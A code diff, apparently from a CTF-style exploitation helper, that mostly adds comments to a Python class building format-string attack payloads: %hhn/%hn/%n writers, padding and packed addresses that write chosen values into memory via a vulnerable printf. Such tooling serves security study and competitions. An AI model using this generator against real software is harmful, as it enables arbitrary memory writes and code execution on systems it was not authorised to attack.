@@ -15,6 +15,9 @@ def u32(x):
 def u16(x):
     return struct.unpack('<H', x)[0]
 
+# PercentN is a class of %n formatter
+# It is used to keep the index unset till it is needed
+# Level can be set separately in each instance
 class PercentN(object):
     write_chars = None
     index = None
@@ -29,7 +32,7 @@ class PercentN(object):
         elif self.level == 0:
             self.write_chars = "%xxx$hhn"
 
-
+    # When needed to be printed/concat-ed, the index will replace the placeholder
     def __str__(self):
         if self.index is not None:
             if self.level == 2:
@@ -59,6 +62,10 @@ class Fmt(object):
         self.targets[address] = val
 
     # Since new class PercentN is used, we need 2 more functions to apply len() and join()
+
+    # This function is to get_length of to_concat list in build()
+    # to calculate offset of addresses
+    # Dividing it by 8 + self.offset is offset of address
     def get_length_to_concat(self, concat_list):
         length = 0
         for item in concat_list:
@@ -68,6 +75,7 @@ class Fmt(object):
                 length += len(str(item))
         return length
 
+    # This function is to concat all formatters(%n and %c) and addresses
     def concat(self, concat_list):
         payload = ""
         for item in concat_list:
@@ -77,27 +85,46 @@ class Fmt(object):
                 payload += str(item)
         return payload
 
+    # This function is to combine targets.
+    # For example, if you use level 0 to generatefmt[0x601050] = p64(0x4142),
+    # the payload will write to 8 addresses. However, this can be trimmed by
+    # write a %n to 0x601054 and a %hn to 0x60105
+    # The algorithm is ugly, a better algorithm is welcomed
     def optimize(self, to_write, level):
+        # We will combine twice to ensure best optimaztion
+        # Worst case: from \x00 to \x00 * 2 to \x00 * 4
+        # so, 2 times maximum
         tmp_to_write = []
         new_to_write = []
+        # Append a level for judging
         for x in to_write:
             x.append(level)
+        # %n can f*** off
         if level == 2:
             return sorted(to_write, key=(lambda x: x[1]))
+
         while len(to_write) > 0:
+            # If it's last target, just pop it to the new(tmp_to_write) one
             if len(to_write) == 1:
                 tmp_to_write.append(to_write.pop(0))
             else:
-                # If current level is 0, check next byte
+                # If current level is %hhn, 1 byte
+                # And current address + 1 == next address
+                # And next level is %hhn, 1 byte
+                # And next num_of_write_chars == 0
+                # For example, {0x400000: 0x43, 0x400001: 0x0}, both %hhn
+                # Can be combined to 0x400000: 0x43 %hn
                 if to_write[0][2] == 0 and to_write[0][0] + 1 == to_write[1][0] and to_write[1][1] == 0 and to_write[1][2] == 0:
                     to_write[0][2] = 1
                     to_write.pop(1)
+                # Likewise
                 elif to_write[0][2] == 1 and to_write[0][0] + 2 == to_write[1][0] and to_write[1][1] == 0 and to_write[1][2] == 1:
                     to_write[0][2] = 2
                     to_write.pop(1)
                 else:
                     tmp_to_write.append(to_write.pop(0))
 
+        # Likewise
         while len(tmp_to_write) > 0:
             if len(tmp_to_write) == 1:
                 new_to_write.append(tmp_to_write.pop(0))
@@ -121,10 +148,12 @@ class Fmt(object):
         self.table = {}
         # (Re)generate splitted key-value dict
         self.build_table(level)
-        # Sort the table in ascending order of value
+        # Sort the table in ascending order of address for optimize()
         to_write = sorted(self.table.items(), key=lambda x: x[0])
+        # Use a list instead of tuple(inmutable)
         to_write = [list(x) for x in to_write]
 
+        # Optimze. Now it's in ascending order of num_write_chars
         to_write = self.optimize(to_write, level)
 
         if debug:
@@ -139,7 +168,7 @@ class Fmt(object):
         tmp_offset = self.offset
         tmp_written = self.written
 
-        # Add %n$c and %n formatters
+        # Add %n$c and %n formatter class
         for kv_target in to_write:
             level = kv_target[2]
             # If previously printed, calculate num of chars to overflow
@@ -151,7 +180,7 @@ class Fmt(object):
                 num_chars_to_write = (kv_target[1] - tmp_written) & (2 ** 8 - 1)
 
             # If num is not 0, first use %0n$c to pad
-            # Else just use %n to write 0
+            # Else just use %n in front of all to write 0
             if num_chars_to_write != 0:
                 print_chars = "{}c".format(num_chars_to_write)
                 # Align to 8
@@ -160,16 +189,17 @@ class Fmt(object):
                 print_chars = "%0" + print_chars
                 to_concat.append(print_chars)
 
-            # Add %n formatter
+            # Add %n formatter class
             to_concat.append(PercentN(level))
 
             # Log how many chars has already been written
             tmp_written += num_chars_to_write
 
 
-        # A to_concat[i] now is either %n$c or %n
         for i in range(len(to_concat)):
+            # to_concat[i] is a %n formatter instance
             if type(to_concat[i]) is PercentN:
+                # Index is offset to address(N of %N$n)
                 to_concat[i].index = self.offset + self.get_length_to_concat(to_concat) / 8
                 to_concat.append(p64(to_write.pop(0)[0]))
         # Construct the payload
